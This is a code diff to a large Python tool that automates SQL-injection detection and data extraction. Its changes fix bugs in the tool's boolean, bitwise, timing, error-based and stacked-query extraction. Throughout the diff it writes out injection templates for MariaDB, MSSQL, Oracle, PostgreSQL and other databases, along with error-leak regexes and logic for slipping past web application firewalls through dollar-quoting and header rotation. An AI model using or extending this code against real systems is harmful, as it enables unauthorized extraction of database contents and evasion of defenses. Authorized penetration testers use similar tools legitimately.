@@ -26030,11 +26030,17 @@ class ConditionalErrorExtractor:
         # If disabled, falls back to: AND (SELECT name FROM sqlite_master WHERE
         # name=SUBSTR(({query}),{pos},1) AND 1=0) IS NOT 'impossible_value'
         # In practice SQLite error leakage is very limited; blind inference is more reliable.
-        # BUG-SQLITE-ERREXTRACT FIX: Previous CAST(x AS INTEGER) was SILENT in SQLite.
-        # Fixed template: CAST(HEX(char)||'x' AS INTEGER) forces "datatype mismatch"
-        # or "cannot convert '41x' to integer" which includes the hex value.
-        # extract_char() decodes the 2-char hex group (e.g. '41') → chr(0x41) = 'A'.
-        "SQLite": "AND 1=CAST(HEX(SUBSTR(({query}),{pos},1))||'x' AS INTEGER)",
+        # BUG-SQLITE-ERREXTRACT-CAST-SILENT FIX (CRITICAL): SQLite's dynamic type system
+        # means CAST(text AS INTEGER) is NEVER an error. For input '41x', SQLite silently
+        # parses the leading digits and returns integer 41 — no error emitted, no message.
+        # The error patterns below ("cannot convert '41x' to integer", "datatype mismatch")
+        # are PostgreSQL/DuckDB messages that SQLite never produces from CAST.
+        # Every extract_char() call returns None, making error-based extraction always "".
+        # SQLite has no reliable in-band error-leaking mechanism without load_extension()
+        # (disabled by default). Remove SQLite from this template dict so ConditionalErrorExtractor
+        # skips SQLite and falls back to blind boolean extraction (UNICODE/SUBSTR oracle),
+        # which does work correctly for SQLite.
+        # "SQLite": REMOVED — error-based extraction not supported on SQLite without load_extension()
         # BUG-R10-B FIX: MariaDB same LIMIT 1 fix as MySQL
         "MariaDB": "AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT ({query}) LIMIT 1),{pos},1),0x7e))",
     }
@@ -26060,7 +26066,7 @@ class ConditionalErrorExtractor:
         # Fix: place the dedicated sentinel pattern BEFORE the generic one.
         re.compile(r"converting (?:the )?(?:nvarchar|varchar|char) value '(.)[aA]'", re.I),
         re.compile(r"Conversion failed when converting.*?value '(.+?)'"),
-        re.compile(r'ORA-20000:.*?[:\s]([^\s\'"]{1,4})', re.I),   # CTXSYS leak
+        re.compile(r'ORA-20000:.*?[:\s]([^\s\'"]{1,8})', re.I),   # CTXSYS leak — {1,8} covers 4-byte emoji UTF-8 hex (8 chars)
         re.compile(r'ORA-29257: host unknown \((.+?)\.'),           # UTL_INADDR leak
         re.compile(r'ORA-\d+:.*?"(.+?)"'),
         re.compile(r'CAST.*?"(.+?)"'),
@@ -53693,6 +53699,10 @@ class Scanner:
                     r'|\d+\s*<>\s*\d+|\d+\s*!=\s*\d+'
                     # BUG-V42-2 FIX: Add single-quoted string-equality conditions
                     r"|'[^']*'\s*=\s*'[^']*'|'[^']*'\s*<>\s*'[^']*'|'[^']*'\s*!=\s*'[^']*'"
+                    # BUG-INFER-DOLLAR-QUOTED FIX: Add PostgreSQL dollar-quoted string equality
+                    # conditions (e.g. $$2021$$=$$2021-$$). ST payloads often use dollar-quoting
+                    # as a WAF bypass for string literals — these were invisible to _cond_pat.
+                    r'|\$[^$]*\$\s*=\s*\$[^$]*\$|\$[^$]*\$\s*<>\s*\$[^$]*\$'
                     r')(\s*\))?',
                     _body, _re.I)
                 if _cond_pat:
@@ -53703,8 +53713,34 @@ class Scanner:
                                  "[INFERENCE]" + _post_p +
                                  _body[_cond_pat.end():])
                     LOG.info("[Inference] Template (boolean-replace): %s", _template[:80])
+                elif _is_stacked:
+                    # BUG-INFERENCE-STACKED-FALLBACK FIX (HIGH): Appending "AND [INFERENCE]"
+                    # to a stacked payload produces syntactically broken SQL — the AND token
+                    # has no valid context after the stacked query's statement boundary.
+                    # For ST technique (semicolon in payload), build a fresh DBMS-aware stacked
+                    # CASE WHEN boolean oracle using the prefix from the detection payload.
+                    # The prefix preserves the WAF-bypass quote/comment structure that allowed
+                    # detection to succeed; the fresh CASE WHEN block provides the boolean oracle.
+                    _st_semi_m = _re.search(r';', _body)
+                    if _st_semi_m:
+                        _st_prefix = _body[:_st_semi_m.start()]
+                    else:
+                        _st_prefix = _body
+                    if _dbms in ("MSSQL", "Sybase"):
+                        _bool_stacked = "; IF ([INFERENCE]) SELECT 1 ELSE SELECT 0"
+                    elif _dbms == "Oracle":
+                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM DUAL"
+                    elif _dbms == "DB2":
+                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM SYSIBM.SYSDUMMY1"
+                    elif _dbms == "Firebird":
+                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END FROM RDB$DATABASE"
+                    else:
+                        # PostgreSQL, MySQL, MariaDB, SQLite, TiDB, etc.
+                        _bool_stacked = "; SELECT CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END"
+                    _template = _st_prefix + _bool_stacked + (_suffix or "-- -")
+                    LOG.info("[Inference] Template (stacked-boolean-fresh): %s", _template[:80])
                 else:
-                    # No static condition found  append AND
+                    # No static condition found and not stacked — append AND as last resort
                     _template = _body + " AND [INFERENCE]"
                     LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
 
@@ -56137,6 +56173,7 @@ class Scanner:
                 return_exceptions=True)
             
             _val = 0
+            _none_bits = []  # collect None-result bit masks for retry
             for _br in _bit_results:
                 # Guard: gather(..., return_exceptions=True) can return BaseException
                 # objects (e.g. CancelledError in Python 3.8+, which is NOT a subclass
@@ -56147,9 +56184,36 @@ class Scanner:
                     return None
                 _mask, _result = _br
                 if _result is None:
-                    return None
-                if _result:
+                    # BUG-BITWISE-NULL-NONE FIX (HIGH): previously any None result returned
+                    # None for the entire character, causing the caller to abort the position.
+                    # On WAF-protected targets with ambiguous SimHash oracle (fixed above),
+                    # None results are transient (oracle just couldn't decide) not permanent.
+                    # Fix: collect None-result bits for a targeted serial retry pass instead
+                    # of failing the whole character.  High-order bits (weight ≥ 128) are
+                    # more likely to be set on garbage-char extractions — retrying them
+                    # individually (with fresh _waf_aware_eval, bypassing cache) gives the
+                    # oracle a second chance on the specific bit that was ambiguous.
+                    _none_bits.append(_mask)
+                elif _result:
                     _val |= _mask
+            # Retry any None-result bits individually (serial, not parallel, to reduce load)
+            _none_bits_still_none = []
+            for _nb_mask in _none_bits:
+                # Find the matching condition string
+                _nb_cond = next((c for m, c in _bit_conds if m == _nb_mask), None)
+                if _nb_cond is None:
+                    _none_bits_still_none.append(_nb_mask)
+                    continue
+                await asyncio.sleep(_delay * 0.5)
+                _nb_r = await _waf_aware_eval(_nb_cond)  # bypass cache for fresh probe
+                if _nb_r is None:
+                    _none_bits_still_none.append(_nb_mask)  # still ambiguous
+                elif _nb_r:
+                    _val |= _nb_mask
+            # If too many high-order bits are still None, the oracle can't resolve this char
+            _high_none = sum(1 for m in _none_bits_still_none if m >= 128)
+            if _high_none >= 3:
+                return None  # too much ambiguity in high-order bits — skip this char
             # BUG-BITWISE-UNICODE-HI FIX: was `32 <= _val <= 255` — the 255 cap discarded
             # all non-Latin-1 Unicode characters (code points 256-65535 for MSSQL/Sybase,
             # 256-1114111 for SQLite) as None.  MSSQL/Sybase use UNICODE() which returns
@@ -56242,7 +56306,13 @@ class Scanner:
         def _is_garbage(text):
             """Detect garbage extraction: non-alphanumeric, repeated chars, etc."""
             if len(text) < 3:
-                return False  # too short to judge
+                # BUG-GARBAGE-SHORT FIX: 1 and 2 char results like 'e'/'ee' ARE garbage
+                # when the expected output is a full word (e.g. 'postgres', 'root').
+                # Any result shorter than 3 chars that contains a supplementary-plane
+                # Unicode codepoint (U+10000+) is definitively garbage (coin-flip bitwise).
+                if any(ord(c) > 0xFFFF for c in text):
+                    return True  # supplementary-plane char = garbage bitwise extraction
+                return False  # too short to judge otherwise
             # Check 1: less than 40% alphanumeric
             _alnum = sum(1 for c in text if c.isalnum())
             if _alnum < len(text) * 0.4:
@@ -56491,7 +56561,30 @@ class Scanner:
             for _try_len in range(0, max_len + 1):
                 r = await _cached_eval(f"{_len_fn}={_try_len}")
                 if r:
-                    return _try_len
+                    # BUG-EQ-LEN-UNCONFIRMED FIX (HIGH): The first True result was immediately
+                    # accepted as the length. With a noisy/ambiguous boolean oracle (especially
+                    # when SimHash gap is near the 0.05 threshold), the oracle may return a
+                    # spurious True for an early length (0, 1, 2...) even though the real length
+                    # is much larger. Root cause in the log: database="e" (length=1) when the
+                    # actual value is "postgres" (length=8).
+                    # Fix: double-confirm by verifying that length-1 is False (or 0 special case)
+                    # and length+1 is also False.  A genuine length=N satisfies length=N True,
+                    # length=N-1 False, length=N+1 False.  A spurious True fails at least one
+                    # of these cross-checks.  Skip length=0 cross-check (can't do -1).
+                    _confirmed = True
+                    if _try_len > 0:
+                        _r_prev = await _cached_eval(f"{_len_fn}={_try_len - 1}")
+                        if _r_prev is True:
+                            _confirmed = False  # oracle returned True for N-1 too — unreliable
+                    if _confirmed and _try_len < max_len:
+                        _r_next = await _cached_eval(f"{_len_fn}={_try_len + 1}")
+                        if _r_next is True:
+                            _confirmed = False  # oracle returned True for N+1 too — unreliable
+                    if _confirmed:
+                        return _try_len
+                    # Cross-check failed: skip this length and keep searching
+                    await asyncio.sleep(_delay * 0.3)
+                    continue
                 await asyncio.sleep(_delay * 0.3)
             return -1
 
@@ -56772,8 +56865,23 @@ class Scanner:
             for _try_len in range(0, max_len + 1):
                 r = await _cached_eval(f"{_len_fn}-{_try_len}=0")
                 if r:
-                    _length = _try_len
-                    break
+                    # BUG-SUB-LEN-UNCONFIRMED FIX (HIGH): Mirrors BUG-EQ-LEN-UNCONFIRMED.
+                    # Accept the first True only after cross-checking neighbours.
+                    # A genuine length=N satisfies: N-1 is False, N+1 is False.
+                    _sub_confirmed = True
+                    if _try_len > 0:
+                        _r_sub_prev = await _cached_eval(f"{_len_fn}-{_try_len - 1}=0")
+                        if _r_sub_prev is True:
+                            _sub_confirmed = False
+                    if _sub_confirmed and _try_len < max_len:
+                        _r_sub_next = await _cached_eval(f"{_len_fn}-{_try_len + 1}=0")
+                        if _r_sub_next is True:
+                            _sub_confirmed = False
+                    if _sub_confirmed:
+                        _length = _try_len
+                        break
+                    await asyncio.sleep(_delay * 0.3)
+                    continue
                 await asyncio.sleep(_delay * 0.3)
             if _length == 0:
                 LOG.info("[Inference] %s: subtraction length=0 (empty or WAF blocked)", label)
@@ -56888,14 +56996,31 @@ class Scanner:
                     _norm_resp = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                     _sim_t = SimHasher.body_similarity(_bool_norm_true, _norm_resp)
                     _sim_f = SimHasher.body_similarity(_bool_norm_false, _norm_resp)
-                    return _sim_t > _sim_f  # closer to true body = True
+                    # BUG-SIMHASH-AMBIGUOUS-EVAL FIX (CRITICAL): When _sim_t ≈ _sim_f the
+                    # gap between true/false similarity is too small to be a reliable signal.
+                    # Returning `_sim_t > _sim_f` in this case is a coin flip — on ~50% of
+                    # probes it says True when the real answer is False, causing bitwise
+                    # extraction to set most bits → garbage codepoints (e.g. chr(0x1FFFFF)).
+                    # Fix: require at least a 0.05 gap (5 percentage points) before committing
+                    # to True/False; return None (ambiguous) when the gap is too small so the
+                    # caller retries or skips the probe, preventing garbage accumulation.
+                    _sim_gap = _sim_t - _sim_f
+                    if abs(_sim_gap) < 0.05:
+                        return None  # too close to call — don't commit to either side
+                    return _sim_gap > 0
                 # Status code comparison
                 if _bool_true_status is not None and _s is not None:
                     return _s == _bool_true_status
                 # Body length comparison — skip when both lengths are equal (CDN cache / dynamic noise)
                 elif (_bool_true_len is not None and _bool_false_len is not None
                         and _bool_true_len != _bool_false_len):
-                    return abs(_bl - _bool_true_len) < abs(_bl - _bool_false_len)
+                    _bl_gap = abs(_bl - _bool_true_len) - abs(_bl - _bool_false_len)
+                    # BUG-BODYLEN-AMBIGUOUS-EVAL FIX: require meaningful length gap (>5B) before
+                    # committing; when the probe body length sits equidistant between true/false,
+                    # a coin flip answer corrupts extraction results.
+                    if abs(_bl_gap) < 5:
+                        return None
+                    return _bl_gap < 0
 
             # BUG-EXT-EVAL-FALLTHROUGH FIX (CRITICAL): When _boolean_oracle=True but
             # every specific sub-check above (hash/header/SimHash/status/length) fell
@@ -56903,12 +57028,12 @@ class Scanner:
             # here is actively harmful: CDN-cached responses all land near _thresh
             # (~180ms), so ms >= _thresh is a coin flip, producing garbage codepoints
             # (e.g. chr(0x1FFFFF) = 󗫵) on every extraction probe.
-            # Fix: when there is no usable timing margin AND _boolean_oracle=True,
-            # return None (ambiguous) so callers can skip/retry the probe.
-            if _boolean_oracle and _margin <= 30:
-                return None  # No oracle fired, no timing signal — probe is ambiguous
+            # Fix: when _boolean_oracle=True and no sub-oracle fired, ALWAYS return None
+            # regardless of _margin — timing path is for timing technique only.
+            if _boolean_oracle:
+                return None  # Boolean oracle active but no sub-oracle fired — probe is ambiguous
 
-            # Timing oracle: compare against threshold
+            # Timing oracle: only reached when _boolean_oracle=False
             return ms >= _thresh
 
         async def _eval_confirm(cond):
@@ -57298,14 +57423,27 @@ class Scanner:
                     _norm_resp = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                     _sim_t = SimHasher.body_similarity(_bool_norm_true, _norm_resp)
                     _sim_f = SimHasher.body_similarity(_bool_norm_false, _norm_resp)
-                    return _sim_t > _sim_f  # closer to true body = True
+                    # BUG-SIMHASH-AMBIGUOUS-WAFEVAL FIX (CRITICAL): Mirror of BUG-SIMHASH-AMBIGUOUS-EVAL.
+                    # _waf_aware_eval feeds _cached_eval which is used by EVERY char extraction path.
+                    # When gap < 0.05 the SimHash oracle cannot distinguish True from False reliably —
+                    # coin-flip results produce garbage codepoints in bitwise extraction and wrong
+                    # length/char matches in equality/subtraction extraction.  Return None so the
+                    # caller retries the probe or skips it instead of recording a random answer.
+                    _sim_gap_wa = _sim_t - _sim_f
+                    if abs(_sim_gap_wa) < 0.05:
+                        return None  # ambiguous — gap too small
+                    return _sim_gap_wa > 0
                 if _bool_true_status is not None and _s is not None:
                     return _s == _bool_true_status
                 _bl = len(_body)
                 # Body length — skip when equal (CDN cache / dynamic noise)
                 if (_bool_true_len is not None and _bool_false_len is not None
                         and _bool_true_len != _bool_false_len):
-                    return abs(_bl - _bool_true_len) < abs(_bl - _bool_false_len)
+                    _bl_gap_wa = abs(_bl - _bool_true_len) - abs(_bl - _bool_false_len)
+                    # BUG-BODYLEN-AMBIGUOUS-WAFEVAL FIX: require meaningful gap before committing.
+                    if abs(_bl_gap_wa) < 5:
+                        return None
+                    return _bl_gap_wa < 0
                 # BUG-PREWIRED-ORACLE-WAFEVAL FIX (HIGH): When all calibration signals are
                 # None (no hash, header, SimHash, or status oracle from calibration) but
                 # _boolean_oracle=True because it was set from the pre-wired detection oracle
@@ -57324,10 +57462,11 @@ class Scanner:
                         pass
             # BUG-EXT-WAFAWARE-FALLTHROUGH FIX (CRITICAL): Mirrors BUG-EXT-EVAL-FALLTHROUGH.
             # Reaches here when _boolean_oracle=True but no sub-oracle fired AND the
-            # pre-wired oracle either wasn't set or raised an exception.  With margin=-7ms
-            # (CDN-cached bypass target), ms >= _thresh is random — breaks all extraction.
-            if _boolean_oracle and _margin <= 30:
-                return None  # No oracle fired, no timing signal — probe is ambiguous
+            # pre-wired oracle either wasn't set or raised an exception.
+            # Fix: ALWAYS return None when _boolean_oracle=True and no sub-oracle fired —
+            # the timing path is for timing technique only, never for boolean technique.
+            if _boolean_oracle:
+                return None  # Boolean oracle active but no sub-oracle fired — probe is ambiguous
             return ms >= _thresh
 
         #  ENHANCEMENT: Auto-adjust timing 
@@ -79096,20 +79235,56 @@ class FastExtractionEngine:
                 # MySQL EXTRACTVALUE format uses ~...~ markers; try this first
                 m = _re.search(r'~([^~]{1,40})~', body)
                 
-                # If MySQL pattern didn't match and we're on a different DBMS, try alternative patterns
+                # BUG-FEE-ALT-PATTERN-ORDER FIX (HIGH): Previously, broad alt patterns
+                # (r"'([^']{1,100})'", r'"([^"]{1,100})"', etc.) were tried BEFORE
+                # DBMS-specific anchored patterns. On non-MySQL DBMSes this caused the
+                # broad double-quote pattern to match the FIRST double-quoted text in the
+                # HTML response (e.g. charset="UTF-8", type="text/html", font-family="...")
+                # rather than the injected data embedded in the actual PostgreSQL/MSSQL
+                # error message. This produced garbage like "]^¨¾1¥À?³?ºéÍÄØ".
+                # Fix: try DBMS-specific anchored patterns FIRST; fall through to broad
+                # patterns only as a last resort.
                 if not m and dbms not in ("MySQL", "MariaDB"):
-                    # Try quoted error values for PostgreSQL/Oracle/MSSQL/etc
-                    for _alt_pattern in [
-                        r"'([^']{1,100})'",           # Single-quoted values
-                        r'"([^"]{1,100})"',            # Double-quoted values  
-                        r":\s*(.{1,100})(?:\n|<)",     # Values after colon
-                        r"value\s+(.{1,100})(?:\n|<)", # "value X" format
-                    ]:
-                        m = _re.search(_alt_pattern, body, _re.I)
+                    # Try DBMS-specific anchored error patterns first
+                    _err_patterns_early = [
+                        r"XPATH syntax error: '([^']+)'",
+                        # MSSQL/Sybase CONVERT error
+                        r"Conversion failed[^']*'([^']{1,200})'",
+                        r"converting the (?:nvarchar|varchar) value '([^']+)'",
+                        # PostgreSQL/CockroachDB/Redshift CAST error
+                        r'invalid input syntax[^:]+:\s*"?([^"\n<]{1,200})"?',
+                        # Oracle CTXSYS/DRG errors
+                        r"DRG-\d+:\s*thesaurus\s+(.+?)\s+does\s+not\s+exist",
+                        r"ORA-\d+[^:]*:\s*([^\n<]{1,200})",
+                        # DB2/Informix errors
+                        r"(?:SQLCODE|SQL\d+N)[^:]*[:\s]+([^\n<]{1,200})",
+                        # Firebird conversion error
+                        r"conversion error[^:]*:\s*\"?([^\"\n<]{1,200})\"?",
+                        # ClickHouse parse error
+                        r"Cannot parse[^:]*:\s*([^\n<]{1,200})",
+                        # SAP HANA
+                        r"cannot convert[^:]*:\s*([^\n<]{1,200})",
+                        # Generic CAST/CONVERT error (last resort before broad patterns)
+                        r"(?:cannot|unable to|failed to)\s+(?:cast|convert)[^:]*[:\s]+([^\n<]{1,200})",
+                    ]
+                    for _early_pat in _err_patterns_early:
+                        m = _re.search(_early_pat, body, _re.I)
                         if m:
-                            LOG.debug(f"[error_extract_string] Matched alternative pattern for {dbms}")
+                            LOG.debug(f"[error_extract_string] Matched specific pattern for {dbms}")
                             break
-                
+                    # Fall back to broad patterns only when all specific patterns failed
+                    if not m:
+                        for _alt_pattern in [
+                            r"'([^']{1,100})'",           # Single-quoted values
+                            r'"([^"]{1,100})"',            # Double-quoted values
+                            r":\s*(.{1,100})(?:\n|<)",     # Values after colon
+                            r"value\s+(.{1,100})(?:\n|<)", # "value X" format
+                        ]:
+                            m = _re.search(_alt_pattern, body, _re.I)
+                            if m:
+                                LOG.debug(f"[error_extract_string] Matched alt fallback pattern for {dbms}")
+                                break
+
                 if m:
                     _extracted_chunk = m.group(1)
                     # BUG #6 FIX: Validate extracted chunk is not garbage
@@ -79121,7 +79296,7 @@ class FastExtractionEngine:
                         LOG.debug(f"[error_extract_string] Chunk at {start}: Garbage data detected: {_extracted_chunk!r}")
                         chunks.append("?")
                 else:
-                    # Try DBMS-specific error patterns
+                    # DBMS-specific error patterns (second-pass for MySQL path that went through ~marker)
                     _err_patterns = [
                         r"XPATH syntax error: '([^']+)'",
                         # MSSQL/Sybase CONVERT error
@@ -108608,11 +108783,6 @@ class TechniqueCascadeEngine:
             else:
                 print("[*]   [PCV] Result: REJECTED  timing technique requires timing proof, body canary alone insufficient (SLEEP doesn't change body)", flush=True)
             return False, 0, _details
-        # Error page: all body checks were blocked, timing failed  REJECT
-        if _is_error_page:
-            print(f"[*]   [PCV] Result: REJECTED  error page ({_bl_status}, {_bl_size}B) requires timing proof, all body checks unreliable", flush=True)
-            return False, 0, _details
-
         # BUG-3-1/3-2 FIX (Req 3): Add Check A+C dual-confirmation path for non-timing
         # techniques (B, BH, IN, E, EH, ST, NV, WB, EX, HY).
         #
@@ -108754,6 +108924,31 @@ class TechniqueCascadeEngine:
                 _INJECTION_CONFIRMED[0] = True  # BUG-RESTORE-RACE FIX
                 _SCAN_STOPPED[0] = True
                 return True, 1, _details
+        # BUG-PCV-ERROR-PAGE-ORDER FIX: Moved _is_error_page rejection to AFTER all
+        # body-confirmation paths (Check A+C, FP-preconfirmed).  Previously this guard
+        # fired BEFORE the BUG-3-1/3-2 Check A+C block, unconditionally rejecting
+        # every non-timing injection on a 400-baseline endpoint
+        # (_is_error_page = _bl_status >= 400 and _bl_size < 100000).
+        # The actual ST confirmation log showed:
+        #   technique=ST, baseline=400/0B (_is_error_page=True)
+        #   detection diff: TRUE=557B vs FALSE=155B (gap=402B, Check A strong)
+        #   error fingerprint reproduced in TRUE response (Check C pass)
+        #
+        # With the old order, the early return fired immediately and Check A+C was
+        # never reached — a false negative on every boolean/error injection whose
+        # server baseline happened to be a 400 error page (common with strict WAFs
+        # that return 400 for unauthenticated requests but allow SQL-bearing requests
+        # through to the DB when the injection changes the query evaluation).
+        #
+        # New order: Check A+C and FP-preconfirmed paths run first.  If they confirm,
+        # the injection is reported.  Only when ALL body checks fail does the error-page
+        # rejection fire — consistent with how timing techniques handle this (they also
+        # only reject after all timing paths are exhausted, not before the first check).
+        if _is_error_page:
+            print(f"[*]   [PCV] Result: REJECTED  error page ({_bl_status}, {_bl_size}B) "
+                  "requires timing proof or strong body evidence, all checks failed",
+                  flush=True)
+            return False, 0, _details
         if _a_pass:
             print(f"[*]   [PCV] Result: REJECTED  body canary borderline (A only, C={_c_pass}), timing+header failed — insufficient for confirmation", flush=True)
         else:
@@ -110885,7 +111080,7 @@ class TechniqueCascadeEngine:
               f"(param={('path-injection' if param in ('__path__','path-injection') else param)!r} req#{_req_num_snap})", flush=True)
         # For header injection techniques, inject into HTTP headers
         _extra_hdrs = None
-        if tech in ("EH","BH","TH","UH"):
+        if tech in ("EH","BH","TH","UH") and data_fmt != "header":
             # BUG-UH-EXTRA-HDR FIX (Req 2/10/12): Added "UH" (Union-Header injection) to
             # the header setup block.  "UH" was missing so _extra_hdrs stayed None, causing
             # UNION payloads to be sent to the URL/body parameter instead of the header —
@@ -110898,6 +111093,16 @@ class TechniqueCascadeEngine:
             # fires up to one more probe (for the current payload) before the stop flag
             # is seen at the _try_technique level.  Adding the check here ensures the
             # header probe is abandoned immediately when injection is confirmed elsewhere.
+            # BUG-HDR-SURFACE-ROTATION-CONFLICT FIX: Guard with `data_fmt != "header"`.
+            # When scanning a header surface (_v14_bg_headers sets data_fmt="header" and
+            # param=the specific header name), EH/BH/TH/UH must NOT enter the rotation
+            # block.  The rotation block puts SQL in a random rotation header via
+            # _extra_hdrs={rotated_hdr: original+payload}, then _final_payload=original
+            # (no SQL) gets written to the *actual target header* by _send_injected_inner
+            # via _header_inject_name.  Result: SQL goes to the wrong header, the target
+            # header receives the clean value, and the server returns 400 for all 138
+            # HDR surfaces.  When data_fmt=="header", _header_inject_name=param already
+            # routes SQL to the correct header — the rotation block must be skipped.
             # BUG-EXTRACTION-SCAN-OVERLAP FIX (Issues 4/9): removed `and not _EXTRACTION_ACTIVE[0]`
             if _SCAN_STOPPED[0]:
                 return None
@@ -111059,7 +111264,14 @@ class TechniqueCascadeEngine:
                 _p_hdrs.update(_pad_extra)
             # Apply keyword bypass if active
             _kw_eng = getattr(self, '_keyword_engine', None)
-            _final_payload = original + payload if tech not in ("EH","BH","TH") else original
+            # BUG-HDR-SURFACE-FINAL-PAYLOAD FIX: When data_fmt=="header" with EH/BH/TH,
+            # the rotation block is skipped (see guard above) so SQL must travel via
+            # _header_inject_name instead.  _send_injected_inner sets
+            # _hdrs[_header_inject_name] = _final_payload, so _final_payload must carry
+            # the injection.  The old condition excluded EH/BH/TH unconditionally (they
+            # used _extra_hdrs for SQL delivery), which left _final_payload=original on
+            # header surfaces — the target header received clean value, SQL never injected.
+            _final_payload = original + payload if (tech not in ("EH","BH","TH") or data_fmt == "header") else original
             if _kw_eng and _kw_eng.working_bypass:
                 _final_payload = _kw_eng.apply_bypass(_final_payload)
             # gate.acquire() above already enforced rate limiting — don't
@@ -128068,7 +128280,13 @@ class MultiStrategyExtractor:
                         "@@version":"@@version",
                         "current_user":"current_user",
                         "user":"user"},
-        "MSSQL":       {"db_name()":"@@servername","user_name()":"system_user",
+        # BUG-MSSQL-NOFUNC-DBNAME FIX (LOW-MEDIUM): Removed "db_name()":"@@servername".
+        # DB_NAME() returns the current DATABASE name (e.g. "AdventureWorks2019").
+        # @@SERVERNAME returns the SERVER INSTANCE name (e.g. "SQLSRV01\PROD") — different values.
+        # Without this entry, _remap_expr("db_name()") hits the function-call guard → returns ""
+        # → nofunc mode correctly skips db_name() → falls back to regular extraction (correct).
+        # The correct nofunc path for timing extraction already omits db_name() (line ~134226).
+        "MSSQL":       {"user_name()":"system_user",
                         "system_user":"system_user","@@version":"@@version",
                         "version()":"@@version"},
         # BUG-V188-005 FIX: Merged first Sybase entry (db_name()→@@servername,
@@ -128406,6 +128624,17 @@ class MultiStrategyExtractor:
             if _m:
                 _prefix = self._det_payload[:_m.start()]
                 return f"{_prefix}AND ({cond}){self._comment}"
+        # BUG-MSE-BUILD-INLINE-STACKED FIX (HIGH): When _det_tmpl is '' (empty, not None)
+        # because _build_det_template found no replaceable condition, AND the detection
+        # payload uses PostgreSQL-style string concatenation (||) rather than AND/OR,
+        # the previous fallback returned f"{self._quote} AND ({cond}){self._comment}".
+        # For ST technique this produces bare "AND (cond)" that the WAF blocks — the
+        # calibration body-diff gap collapses to 0B, oracle is declared not viable, and
+        # _boolean_oracle is never established. Fix: for stacked technique, fall back to
+        # _build_stacked() which constructs a DBMS-aware stacked query matching the WAF
+        # bypass structure used during detection, so the WAF allows the calibration probes.
+        if self._stacked:
+            return self._build_stacked(cond)
         return f"{self._quote} AND ({cond}){self._comment}"
 
     def _build_payload(self, sql_or_cond, force_stacked=None):
@@ -129821,7 +130050,14 @@ class MultiStrategyExtractor:
         self._oracles = _validated
         # BUG-MSE-DENOM-HARDCODED FIX (LOW): denominator was hardcoded as 8 but
         # _probes list only has 3-5 entries. "0/8" is misleading. Use actual probe count.
-        print(f"[MSE] {len(self._oracles)}/{len(_probes)} oracles available: {self._oracles}", flush=True)
+        # BUG-MSE-DENOM-BOOL-MISSING FIX (LOW): For boolean techniques (B/BH/IN/BT/ST/E/EH)
+        # probe_all probes 2 additional bool oracle candidates (bool_body_diff, then
+        # bool_simhash as fallback) that are NOT in _probes.  Denominator was len(_probes)=3,
+        # producing misleading "[MSE] 0/3 oracles available: []" when 5 candidates were
+        # actually tried (3 from _probes + 2 bool oracles).  Add the bool probe count so
+        # the log correctly shows "0/5" for boolean techniques, "0/3" for others.
+        _n_bool_candidates = 2 if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH') else 0
+        print(f"[MSE] {len(self._oracles)}/{len(_probes) + _n_bool_candidates} oracles available: {self._oracles}", flush=True)
         self._calibrated = True
 
         # Enhancement 5: WAF-adaptive tamper discovery
@@ -134127,7 +134363,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # All other printable chars [33-126] are unaffected.
         _char_lo_init = 0  # BUG-V65-TBEXTRACT-LO-INIT FIX: was 32, must be 0 for EOS detection
         if _ascii_func in ("UNICODE",):
-            _char_hi_init = 65535  # full BMP range for MSSQL/SQLite UNICODE()
+            # BUG-SQLITE-TIMING-CHAR-HI FIX (MEDIUM): SQLite UNICODE() returns the full
+            # Unicode scalar range 0..1,114,111 (same as Python ord()). MSSQL UNICODE()
+            # returns only the BMP range 0..65,535 (surrogate pairs not supported in T-SQL).
+            # Both DBMSes reached this branch and got 65535, silently capping any SQLite
+            # character above U+FFFF (emoji=128512, rare SMP chars) at chr(65535)=' '.
+            # Fix: split on dbms — 65535 for MSSQL/Sybase, 1,114,111 for SQLite.
+            _char_hi_init = 1114111 if dbms == "SQLite" else 65535
         elif _ascii_func == "_ORACLE_ASCIISTR_":
             _char_hi_init = 65535  # BUG-R7-TBEXTRACT-ORACLE FIX: full BMP via ASCIISTR
         elif _ascii_func == "ORD":
@@ -141604,6 +141846,15 @@ class WelchConfirmer:
             # the baseline dict so _sim_to_baseline has real mean_length/std_length values.
             _wc_b_samples = baseline.get("samples", []) if isinstance(baseline, dict) else []
             if not _wc_b_samples and not _wc_baseline_patched:
+                # BUG-WELCH-BASELINE-PATCH-0B FIX (MEDIUM): _validate_response() returns
+                # False for a 0B body (allow_empty=False by default). On error-page targets
+                # the clean probe returns 0B → validate returns False → _wc_baseline_patched
+                # stays False → the block retries on every of N_PAIRS iterations, burning
+                # N_PAIRS extra HTTP requests and leaving baseline.mean_length=0 permanently.
+                # Also: the polarity issue (mean_length=0 → false_sim≈true_sim≈baseline)
+                # is mitigated by marking done immediately so retries stop; the patch below
+                # still runs when we DO get a valid body, improving baseline accuracy.
+                _wc_baseline_patched = True  # always mark done first — prevents retry loop
                 try:
                     _wc_ref_fp = await _send_injected(engine, method, url, data, data_fmt,
                                                        param, original, tamper_chain)
@@ -141614,9 +141865,8 @@ class WelchConfirmer:
                         baseline["mean_words"] = getattr(_wc_ref_fp, "body_words", 0)
                         baseline["std_words"] = max(5, int(getattr(_wc_ref_fp, "body_words", 10) * 0.05))
                         baseline["modal_status"] = _wc_ref_fp.status_code
-                        _wc_baseline_patched = True   # BUG-WELCH-BASELINE-PATCH FIX: mark done
                 except Exception:
-                    _wc_baseline_patched = True  # avoid retry-on-error tight loop
+                    pass   # already marked done above; baseline stays as-is
             true_sims.append(_sim_to_baseline(t_fp, baseline))
             false_sims.append(_sim_to_baseline(f_fp, baseline))
             # Early-exit: if first pair is definitively clear, skip remaining pairs
@@ -158395,19 +158645,40 @@ async def _run_fp_guards_boolean(
